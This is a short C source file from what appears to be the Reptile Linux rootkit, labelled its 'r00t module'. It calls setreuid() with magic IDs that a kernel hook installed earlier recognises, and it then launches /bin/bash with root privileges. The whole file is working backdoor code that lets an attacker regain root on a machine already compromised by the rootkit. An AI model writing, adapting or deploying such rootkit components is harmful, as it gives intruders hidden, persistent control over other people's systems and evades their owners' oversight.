/* Reptile r00t module
 * 
 * Author: F0rb1dd3n
 *
 * Description: this program gives root permission using 
 * hooked setreuid() function
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "config.h"

int main(int argc, char *argv[])
{
	char bash[] = "/bin/bash\x00";
	char *envp[1] = { NULL };
	char *arg[3] = {"/bin/bash", NULL};

	if(geteuid() == 0){
		printf("You are already root! :)\n\n");
		exit(0);
	} else if (setreuid(MAGIC_ID_1, MAGIC_ID_2) == 0){
		printf("\e[01;36mYou got super powers!\e[00m\n\n");
		execve(bash, arg, envp);
	} else {
		printf("\e[00;31mYou have no power here! :( \e[00m\n\n");
	}

    	return 0;
}
